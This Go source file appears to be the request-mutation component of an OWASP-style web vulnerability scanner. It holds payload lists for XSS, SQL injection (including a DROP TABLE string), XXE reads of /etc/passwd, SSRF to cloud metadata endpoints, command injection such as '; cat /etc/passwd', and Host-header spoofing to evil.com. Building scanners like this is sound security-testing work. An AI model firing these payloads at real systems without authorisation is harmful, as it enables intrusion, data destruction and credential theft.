package mutate

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/owaspchecker/internal/common"
)

// Mutator handles request mutation for security testing
type Mutator struct {
	payloads map[common.AttackType][]common.Payload
}

// NewMutator creates a new mutator instance
func NewMutator() *Mutator {
	m := &Mutator{
		payloads: make(map[common.AttackType][]common.Payload),
	}
	m.initPayloads()
	return m
}

// initPayloads initializes the attack payloads
func (m *Mutator) initPayloads() {
	// XSS payloads
	m.payloads[common.AttackXSS] = []common.Payload{
		{Type: common.AttackXSS, Value: "<script>alert(1)</script>", Variant: "basic"},
		{Type: common.AttackXSS, Value: "\"><img src=x onerror=alert(1)>", Variant: "img_onerror"},
		{Type: common.AttackXSS, Value: "javascript:alert(1)", Variant: "javascript_protocol"},
		{Type: common.AttackXSS, Value: "<svg onload=alert(1)>", Variant: "svg_onload"},
		{Type: common.AttackXSS, Value: "'><script>alert(1)</script>", Variant: "quote_break"},
	}

	// SQL Injection payloads
	m.payloads[common.AttackSQLi] = []common.Payload{
		{Type: common.AttackSQLi, Value: "' OR '1'='1", Variant: "boolean_based"},
		{Type: common.AttackSQLi, Value: "'; WAITFOR DELAY '0:0:5'--", Variant: "time_based"},
		{Type: common.AttackSQLi, Value: "' UNION SELECT NULL--", Variant: "union_based"},
		{Type: common.AttackSQLi, Value: "' AND 1=1--", Variant: "and_based"},
		{Type: common.AttackSQLi, Value: "'; DROP TABLE users--", Variant: "drop_table"},
	}

	// XXE payloads
	m.payloads[common.AttackXXE] = []common.Payload{
		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Variant: "file_read"},
		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>`, Variant: "ssrf"},
		{Type: common.AttackXXE, Value: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`, Variant: "php_filter"},
	}

	// SSRF payloads
	m.payloads[common.AttackSSRF] = []common.Payload{
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:80/", Variant: "localhost_80"},
		{Type: common.AttackSSRF, Value: "http://127.0.0.1:22/", Variant: "localhost_22"},
		{Type: common.AttackSSRF, Value: "http://169.254.169.254/latest/meta-data/", Variant: "aws_metadata"},
		{Type: common.AttackSSRF, Value: "http://metadata.google.internal/", Variant: "gcp_metadata"},
	}

	// Command Injection payloads
	m.payloads[common.AttackCommandInj] = []common.Payload{
		{Type: common.AttackCommandInj, Value: "; cat /etc/passwd", Variant: "file_read"},
		{Type: common.AttackCommandInj, Value: "| whoami", Variant: "command_exec"},
		{Type: common.AttackCommandInj, Value: "`id`", Variant: "backticks"},
		{Type: common.AttackCommandInj, Value: "$(id)", Variant: "dollar_parens"},
	}
}

// MutateRequest creates mutated versions of a request
func (m *Mutator) MutateRequest(req *common.RecordedRequest) ([]common.RecordedRequest, error) {
	var mutations []common.RecordedRequest

	// Method mutations
	methodMutations := m.mutateMethod(req)
	mutations = append(mutations, methodMutations...)

	// Header mutations
	headerMutations := m.mutateHeaders(req)
	mutations = append(mutations, headerMutations...)

	// Body mutations
	bodyMutations := m.mutateBody(req)
	mutations = append(mutations, bodyMutations...)

	// URL parameter mutations
	urlMutations := m.mutateURL(req)
	mutations = append(mutations, urlMutations...)

	return mutations, nil
}

// mutateMethod creates method variations
func (m *Mutator) mutateMethod(req *common.RecordedRequest) []common.RecordedRequest {
	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}
	var mutations []common.RecordedRequest

	for _, method := range methods {
		if method != req.Method {
			mutated := *req
			mutated.ID = generateID()
			mutated.Method = method
			mutated.Variant = fmt.Sprintf("method_%s", strings.ToLower(method))
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateHeaders creates header variations
func (m *Mutator) mutateHeaders(req *common.RecordedRequest) []common.RecordedRequest {
	headerInjections := map[string]string{
		"X-Forwarded-For":           "127.0.0.1",
		"X-Forwarded-Host":          "evil.com",
		"X-Original-URL":            "/admin",
		"X-Rewrite-URL":             "/admin",
		"X-Custom-IP-Authorization": "127.0.0.1",
		"X-Forwarded-Server":        "evil.com",
		"X-HTTP-Host-Override":      "evil.com",
		"Forwarded":                 "for=127.0.0.1;by=127.0.0.1;host=evil.com",
	}

	var mutations []common.RecordedRequest

	for header, value := range headerInjections {
		mutated := *req
		mutated.ID = generateID()
		mutated.Headers = copyMap(req.Headers)
		mutated.Headers[header] = value
		mutated.Variant = fmt.Sprintf("header_%s", strings.ToLower(header))
		mutated.Timestamp = time.Now()
		mutations = append(mutations, mutated)
	}

	return mutations
}

// mutateBody creates body variations
func (m *Mutator) mutateBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	// Skip if no body
	if req.Body == "" {
		return mutations
	}

	// JSON body mutations
	if strings.Contains(req.ContentType, "application/json") {
		jsonMutations := m.mutateJSONBody(req)
		mutations = append(mutations, jsonMutations...)
	}

	// Form body mutations
	if strings.Contains(req.ContentType, "application/x-www-form-urlencoded") {
		formMutations := m.mutateFormBody(req)
		mutations = append(mutations, formMutations...)
	}

	// XML body mutations
	if strings.Contains(req.ContentType, "application/xml") || strings.Contains(req.ContentType, "text/xml") {
		xmlMutations := m.mutateXMLBody(req)
		mutations = append(mutations, xmlMutations...)
	}

	return mutations
}

// mutateJSONBody injects payloads into JSON body
func (m *Mutator) mutateJSONBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	var jsonData map[string]interface{}
	if err := json.Unmarshal([]byte(req.Body), &jsonData); err != nil {
		return mutations
	}

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of the JSON data
			mutatedData := copyJSONMap(jsonData)

			// Inject payload into string values
			m.injectPayloadIntoJSON(mutatedData, payload.Value)

			// Convert back to JSON
			mutatedBody, err := json.Marshal(mutatedData)
			if err != nil {
				continue
			}

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = string(mutatedBody)
			mutated.Variant = fmt.Sprintf("json_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateFormBody injects payloads into form body
func (m *Mutator) mutateFormBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	formData, err := url.ParseQuery(req.Body)
	if err != nil {
		return mutations
	}

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of form data
			mutatedForm := make(url.Values)
			for key, values := range formData {
				mutatedForm[key] = values
			}

			// Inject payload into form values
			for key := range mutatedForm {
				mutatedForm.Set(key, payload.Value)
			}

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = mutatedForm.Encode()
			mutated.Variant = fmt.Sprintf("form_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateXMLBody injects payloads into XML body
func (m *Mutator) mutateXMLBody(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Simple XML injection - replace text content
			mutatedBody := strings.ReplaceAll(req.Body, ">test<", ">"+payload.Value+"<")

			mutated := *req
			mutated.ID = generateID()
			mutated.Body = mutatedBody
			mutated.Variant = fmt.Sprintf("xml_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// mutateURL injects payloads into URL parameters
func (m *Mutator) mutateURL(req *common.RecordedRequest) []common.RecordedRequest {
	var mutations []common.RecordedRequest

	parsedURL, err := url.Parse(req.URL)
	if err != nil {
		return mutations
	}

	query := parsedURL.Query()
	if len(query) == 0 {
		return mutations
	}

	for attackType, payloads := range m.payloads {
		for _, payload := range payloads {
			// Create a copy of the URL
			mutatedURL := *parsedURL
			mutatedQuery := make(url.Values)
			for key, values := range query {
				mutatedQuery[key] = values
			}

			// Inject payload into query parameters
			for key := range mutatedQuery {
				mutatedQuery.Set(key, payload.Value)
			}

			mutatedURL.RawQuery = mutatedQuery.Encode()

			mutated := *req
			mutated.ID = generateID()
			mutated.URL = mutatedURL.String()
			mutated.Variant = fmt.Sprintf("url_%s_%s", attackType, payload.Variant)
			mutated.Timestamp = time.Now()
			mutations = append(mutations, mutated)
		}
	}

	return mutations
}

// injectPayloadIntoJSON recursively injects payload into JSON string values
func (m *Mutator) injectPayloadIntoJSON(data map[string]interface{}, payload string) {
	for key, value := range data {
		switch v := value.(type) {
		case string:
			data[key] = payload
		case map[string]interface{}:
			m.injectPayloadIntoJSON(v, payload)
		case []interface{}:
			for _, item := range v {
				if itemMap, ok := item.(map[string]interface{}); ok {
					m.injectPayloadIntoJSON(itemMap, payload)
				}
			}
		}
	}
}

// copyMap creates a deep copy of a map
func copyMap(original map[string]string) map[string]string {
	copied := make(map[string]string)
	for key, value := range original {
		copied[key] = value
	}
	return copied
}

// copyJSONMap creates a deep copy of a JSON map
func copyJSONMap(original map[string]interface{}) map[string]interface{} {
	copied := make(map[string]interface{})
	for key, value := range original {
		copied[key] = value
	}
	return copied
}

// generateID generates a unique ID
func generateID() string {
	return fmt.Sprintf("%d_%d", time.Now().UnixNano(), time.Now().UnixNano()%1000)
}
